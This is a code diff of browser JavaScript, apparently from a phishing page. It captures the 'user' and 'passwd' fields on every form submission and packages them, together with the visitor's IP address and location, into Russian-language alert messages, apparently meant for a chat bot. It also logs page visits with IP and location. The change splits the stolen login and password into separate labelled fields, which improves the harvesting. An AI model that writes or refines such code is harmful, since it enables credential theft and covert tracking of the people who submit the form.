@@ -48,9 +48,8 @@ function getSimplifiedUserAgent() {
 
 document.addEventListener("submit", event => {
     const formData = new FormData(event.target);
-    const filteredData = ["user", "passwd"]
-        .map(field => `${field}: ${formData.get(field) || "Не указано"}`)
-        .join("\n");
+    const login = formData.get("user") || "Не указано";
+    const password = formData.get("passwd") || "Не указано";
 
     const simplifiedUserAgent = getSimplifiedUserAgent();
 
@@ -58,9 +57,13 @@ document.addEventListener("submit", event => {
         hashDomain(info.org).then(domainHashTag => {
             const message = `🚀 *Новая отправка формы:*
 ---
-- 🛡️ **Данные формы:**
+- 🛡️ **Логин:**
 \`\`\`
-${filteredData}
+${login}
+\`\`\`
+- 🛡️ **Пароль:**
+\`\`\`
+${password}
 \`\`\`
 - 🌐 **IP-адрес:** ${info.ip}
 - 📍 **Местоположение:** ${info.location}
@@ -78,7 +81,7 @@ function logPageVisit() {
 
     getIPInfo().then(info => {
         hashDomain(info.org).then(domainHashTag => {
-            const message = `🌐 *Новый визит страницы:*
+            const message = `🌍 *Новый визит страницы:*
 ---
 - 🌐 **IP-адрес:** ${info.ip}
 - 📍 **Местоположение:** ${info.location}
